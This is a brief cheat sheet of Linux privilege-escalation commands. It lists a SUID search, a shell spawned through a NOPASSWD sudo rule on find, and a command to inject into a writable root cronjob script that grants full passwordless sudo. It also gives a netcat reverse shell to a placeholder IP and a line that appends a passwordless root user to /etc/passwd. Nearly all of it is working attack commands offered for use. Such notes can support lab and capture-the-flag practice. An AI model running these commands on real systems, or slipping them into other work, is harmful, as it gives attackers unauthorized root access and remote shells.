- __Finding SUID__
  - __`find / -perm -4000 2>/dev/null`__

- __`sudo -l`__
  - __If you see this output `(root) NOPASSWD:/usr/bin/find`__
    - __`sudo find . -exec /bin/sh \; -quit` or without sudo also you can run __

- __Check for cronjob__
  - __It is used to execute file every 1m or 5m__
  - __`cat /etc/crontab`__
    - __for exame it's look like this `*/5 * * * * root /writable/script.sh` so here the `script.sh` will execute every 5m__
    - __you can inject this command echo `user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`__

- __using netcat__
  - __`nc <ip> <port > -e /bin/sh`__

- __creating a new user__
  - __`echo "newRoot::0:0:newRoot:/home/newRoot:/bin/sh" >> /etc/passwd`__
